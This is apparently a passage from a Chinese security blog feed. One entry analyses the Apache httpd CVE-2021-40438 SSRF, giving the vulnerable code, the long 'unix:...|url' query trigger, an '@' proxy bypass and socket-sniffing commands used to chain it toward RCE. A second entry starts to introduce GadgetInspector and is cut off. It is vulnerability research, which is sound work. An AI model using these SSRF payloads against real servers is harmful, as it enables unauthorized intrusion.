src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/9.png"></p><p>我们查下这两个函数的用法</p><p>ap_strcasestr(s1,s2):从s1中搜索s2, 返回s2开始的指针，不考虑大小写，相同则返回0</p><p>ap_cstr_casecmpn(s1,s2,n): 对比s2与s1的前n位，不考虑大小写，相同则返回0</p><p>函数定义在</p><p><a href="https://ci.apache.org/projects/httpd/trunk/doxygen/group__APACHE__CORE__DAEMON.html#ga2ebda07cacb3088e5cbaca755303594b">https://ci.apache.org/projects/httpd/trunk/doxygen/group__APACHE__CORE__DAEMON.html#ga2ebda07cacb3088e5cbaca755303594b</a></p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/10.png"></p><p><a href="https://ci.apache.org/projects/httpd/trunk/doxygen/group__APACHE__CORE__DAEMON.html#gaa6a7169f7d3801b11d3b113b27284dbd">https://ci.apache.org/projects/httpd/trunk/doxygen/group__APACHE__CORE__DAEMON.html#gaa6a7169f7d3801b11d3b113b27284dbd</a></p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/11.png"></p><p>简单解释下此次补丁变化：原来是从s1整个字符串搜索”unix:”，现在限定只能是前5位，也就是s1需要以”unix:”开头。我们查看下漏洞函数<code>proxy_util.c#fix_uds_filename()</code>  方法代码</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs xl">static void fix_uds_filename(request_rec *r, char **url) <br>&#123;<br>    char *ptr, *ptr2;<br>    <span class="hljs-function"><span class="hljs-title">if</span> (!r || !r-&gt;</span>filename) return;<br><span class="hljs-comment">//1、strncmp 比较r-&gt;filename的前6位与proxy:，相同返回0，包含返回正值 不包含返回负值</span><br>    <span class="hljs-function"><span class="hljs-title">if</span> (!strncmp(r-&gt;</span>filename, <span class="hljs-string">&quot;proxy:&quot;</span>, <span class="hljs-number">6</span>) &amp;&amp;<br>            (<span class="hljs-function"><span class="hljs-title">ptr2</span> = ap_strcasestr(r-&gt;</span><span class="hljs-function"><span class="hljs-title">filename</span>, &quot;unix:&quot;)) &amp;&amp;  //2、从r-&gt;</span>filename 整个字符串中搜索 unix:<br>            (ptr = ap_strchr(ptr2, <span class="hljs-string">&#x27;|&#x27;</span>))) &#123;<br>        apr_uri_t urisock;<br>        apr_status_t rv;<br>        *ptr = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>        <span class="hljs-function"><span class="hljs-title">rv</span> = apr_uri_parse(r-&gt;</span>pool, ptr2, &amp;urisock);<br>        <span class="hljs-keyword">if</span> (rv == APR_SUCCESS) &#123;<br>            char *rurl = ptr+<span class="hljs-number">1</span>;<br>            <span class="hljs-function"><span class="hljs-title">char</span> *sockpath = ap_runtime_dir_relative(r-&gt;</span>pool, urisock.<span class="hljs-built_in">path</span>);<span class="hljs-comment">//3、得到uds路径</span><br>            <span class="hljs-function"><span class="hljs-title">apr_table_setn</span>(r-&gt;</span>notes, <span class="hljs-string">&quot;uds_path&quot;</span>, sockpath);<br>            *<span class="hljs-function"><span class="hljs-title">url</span> = apr_pstrdup(r-&gt;</span>pool, rurl); <span class="hljs-comment">/* so we get the scheme for the uds */</span><br>            <span class="hljs-comment">/* r-&gt;filename starts w/ &quot;proxy:&quot;, so add after that */</span><br>            <span class="hljs-function"><span class="hljs-title">memmove</span>(r-&gt;</span>filename+<span class="hljs-number">6</span>, rurl, strlen(rurl)+<span class="hljs-number">1</span>);<br>            ap_log_rerror(APLOG_MARK, APLOG_TRACE2, <span class="hljs-number">0</span>, r,<br>                    <span class="hljs-string">&quot;*: rewrite of url due to UDS(%s): %s (%s)&quot;</span>,<br>                    <span class="hljs-function"><span class="hljs-title">sockpath</span>, *url, r-&gt;</span>filename);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            *ptr = <span class="hljs-string">&#x27;|&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>代码从r-&gt;filename中根据<code>unix:</code>及<code>|</code>的位置解析出uds路径及url，并且判断r-&gt;filename是否以<code>proxy:</code>开头</p><h3 id="2-3-原理分析"><a href="#2-3-原理分析" class="headerlink" title="2.3 原理分析"></a>2.3 原理分析</h3><p>请求代理路由<code>/link</code>，看到了这样一条日志<code>URI path &#39;/link&#39; matches proxy handler &#39;proxy:http://127.0.0.1:8000/&#39;</code></p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/12.png"></p><p>根据该日志信息找到了mod_proxy.c#ap_proxy_trans_match()，再次发送后，看到r-&gt;filename的值为<code>proxy:http://127.0.0.1:8000/</code>,代理请求<code>r-&gt;proxyreq</code>为反向代理<code>PROXYREQ_REVERSE</code></p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/13.png"></p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/14.png"></p><p>这样就解释了为什么漏洞函数<code>proxy_util.c#fix_uds_filename()</code>  需要先检测是否以<code>proxy:</code>开头。我们查看apache mod_proxy uds的正常用法</p><p><a href="https://www.docs4dev.com/docs/zh/apache/2.4/reference/mod-mod_proxy.html">https://www.docs4dev.com/docs/zh/apache/2.4/reference/mod-mod_proxy.html</a></p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/15.png"></p><p>apache从  2.4.7  开始支持了uds（但经过实际测试，我在2.4.9才找到了支持uds路径的写法），具体用法是<code>ProxyPass /links &quot;unix:/home/www.socket|http://localhost/whatever/&quot;</code>，当访问&#x2F;links  代理配置经过<code>proxy_util.c#fix_uds_filename()</code>解析后，uds路径为<code>/home/www.socket</code>及转发url为<code>http://localhost/whatever/</code>,结合补丁代码修改部分，我们将uds代理字符串添加到参数位置进行测试：<code>/link?unix:/home/www.socket|http://localhost/whatever/</code></p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/16.png"></p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/17.png"></p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/18.png"></p><p>可以看到经过proxy_util.c#fix_uds_filename()解析处理，成功赋值给uds_path及转发url。到这里漏洞触发点就明了了：当目标apache使用代理模块时，攻击者通过在代理路由的参数注入uds路径及转发url实现任意uds请求&#x2F;url请求。现在可以请求任意uds地址。但是距离任意SSRF，还有一个问题：在经过fix_uds_filename()解析出uds、url后，会在mod_proxy_http.c#ap_proxy_determine_connection()中去请求uds&#x2F;url，当uds不存在时，才会去请求url</p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/19.png"></p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/20.png"></p><p>所以问题就变成了如果使解析出来的uds值为null，老外使用了一个巧妙的方法，在fix_uds_filename()解析uds的代码：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-built_in">char</span> *sockpath = ap<span class="hljs-constructor">_runtime_dir_relative(<span class="hljs-params">r</span>-&gt;<span class="hljs-params">pool</span>, <span class="hljs-params">urisock</span>.<span class="hljs-params">path</span>)</span>;<br>apr<span class="hljs-constructor">_table_setn(<span class="hljs-params">r</span>-&gt;<span class="hljs-params">notes</span>, <span class="hljs-string">&quot;uds_path&quot;</span>, <span class="hljs-params">sockpath</span>)</span>;<br></code></pre></td></tr></table></figure><p>config.c#ap_runtime_dir_relative()</p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/21.png"></p><p>在filepath.c#apr_filepath_merge()中，当<code>rootpath</code>(&#x2F;root&#x2F;apache&#x2F;httpd-bin&#x2F;logs)与传入的路径长度之和+4大于4096时，返回名称过长错误。就会导致代码走到1625行，返回uds_path的值为null</p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/22.png"></p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/23.png"></p><p>所以在unix:与|之间传入大于(4097-4-len(rootpath))&#x3D;4066个字符时就会产生SSRF漏洞，可以看到服务端成功请求了地址： <a href="http://localhost:8001/whatever/">http://localhost:8001/whatever/</a></p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/24.png"></p><p>这样，漏洞就可以达到SSRF、任意uds请求的效果，接着看看这个漏洞在实际漏洞挖掘场景中的情况</p><h2 id="3、实际场景"><a href="#3、实际场景" class="headerlink" title="3、实际场景"></a>3、实际场景</h2><p>该漏洞触发的条件是Apache Httpd开启mod_proxy模块，使用到反向代理且路由可以从前台访问。如果目标系统满足条件，就可以从前台请求到服务端存在敏感功能的uds&#x2F;服务，完成一个前台漏洞的触发串联。本章节演示这个漏洞在实际场景中的一些情况</p><h3 id="3-1-特殊配置"><a href="#3-1-特殊配置" class="headerlink" title="3.1 特殊配置"></a>3.1 特殊配置</h3><p>在测试过程中发现存在一种特殊配置，当路径以&#x2F;结尾，但是代理地址不以&#x2F;进行结尾时，可以通过@绕过代理触发SSRF漏洞，这里记录一下。如果平时测试碰到<code>/admin/module//login</code> 类似路径，可以使用<code>/admin/module/@127.0.0.1:8833</code> 测试，如果恰好httpd使用的<strong>路径以&#x2F;结尾，但是代理地址不以&#x2F;进行结尾</strong>的特殊配置时，目标机器会触发ssrf漏洞请求127.0.0.1:8833</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">ProxyPass <span class="hljs-regexp">/lin/</span> <span class="hljs-string">&quot;http://127.0.0.1:8000&quot;</span><br>ProxyPassReverse <span class="hljs-regexp">/lin/</span> <span class="hljs-string">&quot;http://127.0.0.1:8000&quot;</span><br><br>会造成SSRF问题<br><span class="hljs-regexp">/lin/</span>@<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8001</span>   http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8000</span>@<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8001</span><br></code></pre></td></tr></table></figure><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/25.png"></p><h3 id="3-2-漏洞思考？"><a href="#3-2-漏洞思考？" class="headerlink" title="3.2 漏洞思考？"></a>3.2 漏洞思考？</h3><p>在分析完CVE-2021-40438后感觉这个漏洞的影响是被低估的，该漏洞能覆盖影响Httpd 2.4.9-2.4.48 近40个小版本、mod_proxy ProxyPass配置很常见、代理也多为前台触发访问，非常适合做为漏洞挖掘绕过权限的突破口 。当时正在研究Vmware家的Vmware Vrealize operations产品，也跟进测试了最新版，发现部署的是httpd 2.4.46版本、配置使用了代理模块、路由也可以从前台触发。所以最新版是受CVE-2021-40438影响的，但是当时并没有找到后端可用的uds完成rce，比较遗憾。只给vmware发了ssrf的报告，后面官方出了安全更新升级了httpd的版本</p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/26.png"></p><p>官方出的公告：<a href="https://kb.vmware.com/s/article/87227">https://kb.vmware.com/s/article/87227</a></p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/27.png"></p><p>复现截图</p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/28.png"></p><h3 id="3-3-向RCE进发"><a href="#3-3-向RCE进发" class="headerlink" title="3.3 向RCE进发"></a>3.3 向RCE进发</h3><p>由于在vmware产品中没有找到可利用的uds完成RCE，比较遗憾但是并没有放弃这个攻击面。后续也审计了几款应用，最终成功在XXX与XXX产品中串联起来完成了RCE。如果想要完成RCE的效果需要串联后端的敏感服务，其中WEB服务的审计与平时审计思路差别不大，而自己对于uds部分的知识还是欠缺的，所以利用这次机会做一波知识储备。<strong>扩大知识面-&gt;知识面决定攻击面！</strong></p><p>在查找资料过程中看到百度安全团队在blackhat 2022大会上对安卓上得Unix Domain Socket 攻击面做了梳理， 可以作为知识补充学习一波。议题名称：Unix Domain Socket: A Hidden Door Leading to Privilege Escalation in the Android Ecosystem     议题paper：<a href="https://developer.baidu.com/article/detail.html?id=295123">https://developer.baidu.com/article/detail.html?id=295123</a>   议题slides：<a href="https://i.blackhat.com/Asia-22/Thursday-Materials/AS-22-Ke-Unix-Domain-Socket-A-Hidden-Door.pdf">https://i.blackhat.com/Asia-22/Thursday-Materials/AS-22-Ke-Unix-Domain-Socket-A-Hidden-Door.pdf</a></p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/29.png"></p><p>unix域套接字uds(Unix Domain Socket)与传统网络套接字得主要区别是：网络套接字使用ip与端口标识客户端与服务端，而域套接字uds使用系统文件名，这个文件被称为套接字文件。套接字文件有两种形式：一种是绝对路径 类似&#x2F;var&#x2F;rpc&#x2F;rpc.sock；另外一种是抽象路径 类似@jd-control，即一个不存在得路径。这里整理了几个与uds相关的命令</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">netstat -a -p --unix   <span class="hljs-regexp">//</span>列出本地得unix套接字<br>lsof -U  <span class="hljs-regexp">//</span>显示uds的相关信息<br>fuser -v <span class="hljs-regexp">/var/</span>rpc.sock  <span class="hljs-regexp">//</span>显示使用该套接字的用户、进程pid、访问方式和命令等信息<br></code></pre></td></tr></table></figure><p>在审计XXX系统时，发现其使用了Apache httpd 2.4.41版本，在&#x2F;apache&#x2F;conf&#x2F;httpd.conf中看到配置启动了代理模块mod_proxy(使用指令ProxyPass、ProxyPassReverse)，且代理路由可以从前台访问，满足该漏洞的条件要求</p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/30.png"></p><p>接下来就是寻找能够串联起来完成利用的后端服务，本次审计主要聚焦于uds。<code>lsof -U</code>命令用于显示Unix Domain Socket (UDS)的相关信息，包括哪些进程正在使用指定的UDS文件以及它们的详细信息</p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/31.png"></p><p>看到有个xmlrpc.sock、xmlrpc0.sock、xmlrpc1.sock，检索下相关进程</p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/32.png"></p><p>这个是python启动的后端进程，而该系统的WEB前台XXX敏感功能处与后端的xmlrpc uds有交互请求</p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/33.png"></p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/34.png"></p><p>那只要能拿到最终请求到uds的数据包，我们就可以绕过WEB侧鉴权转而利用httpd侧代理漏洞请求uds完成漏洞串联利用。尝试了很多方法，最终通过创建中转流量的8089端口成功抓到了uds的数据包。在过程中使用tcpdump抓取xmlrpc.sock的流量发现为空，在查看了cfg配置文件结合上面的进程信息发现还有xmlrpc0.sock与xmlrpc1.sock，随即对这两个sock也进行了监听，最后成功在xmlrpc1.sock中发现了请求uds的流量</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span><span class="hljs-number">1</span>、在本地<span class="hljs-number">8089</span>端口中转流量<br>mv <span class="hljs-regexp">/var/</span>run<span class="hljs-regexp">/rpc/</span>xmlrpc1.sock <span class="hljs-regexp">/var/</span>run<span class="hljs-regexp">/rpc/</span>xmlrpc1.sock.original<br>socat TCP-LISTEN:<span class="hljs-number">8089</span>,reuseaddr,fork UNIX-CONNECT:<span class="hljs-regexp">/var/</span>run<span class="hljs-regexp">/rpc/</span>xmlrpc1.sock.original<br>socat UNIX-LISTEN:<span class="hljs-regexp">/var/</span>run<span class="hljs-regexp">/rpc/</span>xmlrpc1.sock,fork TCP-CONNECT:<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8089</span><br><br><span class="hljs-regexp">//</span><span class="hljs-number">2</span>、获取最终到uds的流量并输出到lo-test.pcap文件，再使用wireshark分析<br>tcpdump -i lo -netvv port <span class="hljs-number">8089</span> -w lo-test.pcap<br><br><span class="hljs-regexp">//</span><span class="hljs-number">3</span>、测试完毕后还原备份<br>mv <span class="hljs-regexp">/var/</span>run<span class="hljs-regexp">/rpc/</span>xmlrpc1.sock.original <span class="hljs-regexp">/var/</span>run<span class="hljs-regexp">/rpc/</span>xmlrpc1.sock<br><br>注：reuseaddr 绑定本地一个端口、fork 多链接模式，每当有一个新连接请求到达时，fork出一个子进程来处理该连接，以保持并发性<br></code></pre></td></tr></table></figure><p>在监听uds后返回到web界面，手动点击操作XX功能后，lo-test.pcap就有了内容，使用wireshark打开pcap包筛选host就能找到具体的数据包</p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/35.png"></p><p>返回数据：</p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/36.png"></p><p>那么将该数据包转为使用httpd代理漏洞的格式发送给uds即可完成漏洞利用，第一次在这里测试时多次碰到返回502、503、408等错误状态码的情况。为了定位在httpd c代码中的具体报错信息，我这里手动修改配置文件httpd-ssl.conf与httpd.conf，开启日志记录并重启httpd，配置信息如下</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs awk">LogLevel notice proxy:trace8<br>CustomLog <span class="hljs-string">&quot;/usr/local/apache/logs/httpd-ssl-accesslog.log&quot;</span> common<br>ErrorLog <span class="hljs-string">&quot;/usr/local/apache/logs/httpd-ssl-error.log&quot;</span><br>LogLevel warn<br><br>覆盖文件httpd.conf、httpd-ssl.conf<br><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/apache/</span>bin/httpd -k stop<br><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/apache/</span>bin/httpd -k start<br>ps -ef|grep httpd  <span class="hljs-regexp">//</span>看到httpd进程证明重启成功<br></code></pre></td></tr></table></figure><p>最终成功构造出从前台直接请求后端uds的数据包，完成漏洞利用</p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/37.png"></p><p>Just For Fun！</p><h2 id="4、参考链接"><a href="#4、参考链接" class="headerlink" title="4、参考链接"></a>4、参考链接</h2><p><a href="https://firzen.de/building-a-poc-for-cve-2021-40438">https://firzen.de/building-a-poc-for-cve-2021-40438</a></p><p><a href="https://www.leavesongs.com/PENETRATION/apache-mod-proxy-ssrf-cve-2021-40438.html">https://www.leavesongs.com/PENETRATION/apache-mod-proxy-ssrf-cve-2021-40438.html</a></p><p><a href="https://mivehind.net/2018/04/20/sniffing-unix-domain-sockets/">https://mivehind.net/2018/04/20/sniffing-unix-domain-sockets/</a></p><p><a href="https://plantegg.github.io/2018/01/01/%E9%80%9A%E8%BF%87tcpdump%E5%AF%B9Unix%20Socket%20%E8%BF%9B%E8%A1%8C%E6%8A%93%E5%8C%85%E8%A7%A3%E6%9E%90/">https://plantegg.github.io/2018/01/01/%E9%80%9A%E8%BF%87tcpdump%E5%AF%B9Unix%20Socket%20%E8%BF%9B%E8%A1%8C%E6%8A%93%E5%8C%85%E8%A7%A3%E6%9E%90/</a></p><p><a href="https://developer.baidu.com/article/detail.html?id=295123">https://developer.baidu.com/article/detail.html?id=295123</a></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
      <tag>CVE-2021-40438</tag>
      
      <tag>SSRF-TO-RCE</tag>
      
      <tag>Unix-Domain-Socket</tag>
      
      <tag>漏洞挖掘思路</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>静态代码扫描工具之GadgetInspector探究</title>
    <link href="/2023/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/"/>
    <url>/2023/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/</url>
    
    <content type="html"><![CDATA[<p>反序列化漏洞一直占据着JAVA安全的半壁江山，是每个JAVA安全研究者都绕不开的大山之一。从15年被 <a href="https://twitter.com/frohoff">@frohoff</a> and <a href="https://twitter.com/gebl">@gebl</a> 公布利用到现在近8年的时间，反序列化漏洞在Oracle&#x2F;Apache&#x2F;vmware&#x2F;IBM&#x2F;国产等众多厂商的系统、组件、中间件中肆虐横行。笔者在之前文章分析的JNDI&#x2F;RMI&#x2F;JMX等均与此安全问题有千丝万缕的关系。链接直达：</p><p><a href="https://pwnull.github.io/2022/How-to-attack-RMI-based-JMX-services/"> Attack JMX Service的打开方式 </a></p><p><a href="https://pwnull.github.io/2022/Exploring-JAVA-RMI's-offensive-and-defensive-history/">论JAVA-RMI的攻防演进史</a></p><p><a href="https://pwnull.github.io/2022/jndi-injection-history/">当我们谈论JNDI注入时，我们在谈论什么</a></p><p>反序列化漏洞利用的入口方法source及最终漏洞触发方法sink都容易确定，而寻找连接入口方法到漏洞触发方法中间的利用链路才是挖掘与利用的重点。在日常的审计挖掘过程中，日益感觉ysoserial、marshalsec中现存的利用链并不能百发百中，很多时候都需要我们根据现有环境寻找新的利用链。在寻找过程中也非常考验挖掘者的知识储备与耐心。那有没有一款自动化&#x2F;半自动化的工具可以辅助我们去寻找呢？为了解决这个问题，Ian Haken在18年的blackhat大会推出了一款自研扫描工具 GadgetInspector，关于该款工具的原文介绍、源码及视频如下：</p><p>源码：<a href="https://github.com/JackOfMostTrades/gadgetinspector">https://github.com/JackOfMostTrades/gadgetinspector</a></p><p>文稿：<a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf">https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf</a></p><p>视频：<a href="https://www.youtube.com/watch?v=fdctNIt8OIw">https://www.youtube.com/watch?v=fdctNIt8OIw</a></p><p>圈内的师傅也对此工具做过分析与完善，本文也参考了一些师傅们的文章，致敬感谢分享！</p><p><a href="https://threedr3am.github.io/2020/01/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%87%AA%E5%8A%A8%E6%8C%96%E6%8E%98%E5%B7%A5%E5%85%B7gadgetinspector%E6%BA%90%E7%A0%81%E6%B5%85%E6%9E%90/">threedr3am-java反序列化利用链自动挖掘工具gadgetinspector源码浅析</a></p><p><a href="https://paper.seebug.org/1034/">Longofo-Java 反序列化工具 gadgetinspector 初窥</a></p><p><a href="https://su18.org/post/gadgetor/">su18-高效挖掘反序列化漏洞——GadgetInspector改造</a></p><p>整体来看 GadgetInspector工具运行流程主要为对classpath中全部class进行信息收集，生成方法内、方法间的污点传递关系，最终找到从source可以通往sink的利用链。另外扫描针对的是java字节码，所以可以直接分析Jar包&#x2F;War包而无需项目java源码。整个过程还是比较清晰的，其中涉及到JAVA ASM技术、JVM指令、逆拓扑排序、进出栈模拟等等知识。之前对这块内容了解不多，也想做个扫描工具辅助自己做一些基础审计的工作，争取早日解放双手！本文从所需的前置知识、分析扫描流程中的关键类及实际测试扫描三部分展开，如果对文章有疑问&#x2F;建议或者想一起研究交流的师傅，欢迎私信😜</p><h2 id="1、前置知识"><a href="#1、前置知识" class="headerlink" title="1、前置知识"></a>1、前置知识</h2><p>前置知识部分主要有描述符、ASM技术及JVM相关的知识。万丈高楼平地起，晓得了基础知识方便后续展开分析</p><h3 id="1-1-描述符"><a href="#1-1-描述符" class="headerlink" title="1.1 描述符"></a>1.1 描述符</h3><p>GadgetInspector最开始对类、方法信息搜集阶段会用到类型及方法描述符</p><p>1、类型描述符，JAVA原始类型的描述符均对应一个大写字母。非数组的引用类型使用：<code>L+类全限定名称+;</code> 、数组引用类型使用：<code>[+数组内类型描述符+;</code></p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">byte</span> -&gt;</span> B<br><span class="hljs-function"><span class="hljs-title">short</span> -&gt;</span> S<br><span class="hljs-function"><span class="hljs-title">int</span> -&gt;</span> I<br><span class="hljs-function"><span class="hljs-title">long</span> -&gt;</span> J<br><span class="hljs-function"><span class="hljs-title">float</span> -&gt;</span> F<br><span class="hljs-function"><span class="hljs-title">double</span> -&gt;</span> D<br><span class="hljs-function"><span class="hljs-title">char</span> -&gt;</span> C<br><span class="hljs-function"><span class="hljs-title">void</span> -&gt;</span> V<br><span class="hljs-function"><span class="hljs-title">boolean</span> -&gt;</span> Z<br><br><span class="hljs-function"><span class="hljs-title">java</span>.lang.Runtime -&gt;</span> Ljava/lang/Runtime;<br><span class="hljs-function"><span class="hljs-title">java</span>.lang.Object[] -&gt;</span> [java/lang/Object;<br><span class="hljs-function"><span class="hljs-title">int</span>[][] -&gt;</span> [[I<br></code></pre></td></tr></table></figure><p>2、方法描述符</p><p>字节码中保存参数类型列表及返回值类型时会用到方法描述符，规则：1、格式为<code>(+参数列表+)+返回值;</code>2、参数列表无需用逗号分割</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-built_in">String</span> add<span class="hljs-function"><span class="hljs-params">(int a,int b)</span> -&gt;</span> (II)Ljava/lang/<span class="hljs-built_in">String</span>;<br><span class="hljs-literal">void</span> sub<span class="hljs-function"><span class="hljs-params">(int a,int b)</span> -&gt;</span> (II)V<br>int[] s<span class="hljs-function"><span class="hljs-params">(<span class="hljs-built_in">Object</span> obj)</span> -&gt;</span> (Ljava/lang/<span class="hljs-built_in">Object</span>;)[I<br><span class="hljs-literal">void</span> a<span class="hljs-function"><span class="hljs-params">()</span> -&gt;</span> ()V<br></code></pre></td></tr></table></figure><p>3、方法 access值</p><p>access值是按照方法的修饰符对应值做”按位或|”计算得来的，如main函数为public、static修饰，则<code>access = ACC_PUBLIC(1) | ACC_STATIC(8) = 9</code>，具体对应值的定义在org.objectweb.asm.Opcodes类中</p><table><thead><tr><th>access</th><th>name</th><th>desc</th></tr></thead><tbody><tr><td>1</td><td><init></td><td>()V</td></tr><tr><td>9</td><td>main</td><td>([Ljava&#x2F;lang&#x2F;String;)V</td></tr></tbody></table><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/1.png"></p><p><client>方法：java类加载初始化过程中，会将类中的类变量赋值、静态代码块中的语句集合为<client>方法</p><h3 id="1-2-ASM技术"><a href="#1-2-ASM技术" class="headerlink" title="1.2 ASM技术"></a>1.2 ASM技术</h3><p>GadgetInspector中主要利用了ASM的访问者模式对类&#x2F;方法进行观察操作，ASM封装了对于class文件结构各项元素的操作，对类使用ClassVisitor实现类进行观察、对方法使用MethodVisitor实现类进行观察</p><p>ClassVisitor 用于观察类信息，GadgetInspector中使用的几个类观察类：MethodDiscoveryClassVisitor、MethodCallDiscoveryClassVisitor、PassthroughDataflowClassVisitor、ModelGeneratorClassVisitor。这些类都继承实现了父类ClassVisitor的visitXXX方法，如下是方法名称及触发调用的条件</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">visit</span> 初始化被观察类的描述信息<br>visitField 观察到属性时触发此方法<br>visitMethod 观察到方法时触发此方法<br></code></pre></td></tr></table></figure><p>MethodVisitor 用于观察方法信息，GadgetInspector中使用的几个方法观察类：MethodCallDiscoveryMethodVisitor、PassthroughDataflowMethodVisitor、ModelGeneratorMethodVisitor、TaintTrackingMethodVisitor。在这些类中涉及到几个比较重要且频繁调用的visitXXX方法，如下是方法名称及触发调用的条件</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">visitCode</span> 进入方法时触发<br>visitMethodInsn 方法内调用子方法时触发<br>visitInsn 碰到无操作数指令时触发<br>visitFieldInsn 调用字段时触发<br>visitVarInsn 操作变量时触发<br></code></pre></td></tr></table></figure><p>另外可以使用IDEA的ASM Bytecode Viewer插件查看类对应的字节码及ASM代码</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/2.png"></p><p>ASM代码</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/3.png"></p><h3 id="1-3-JVM"><a 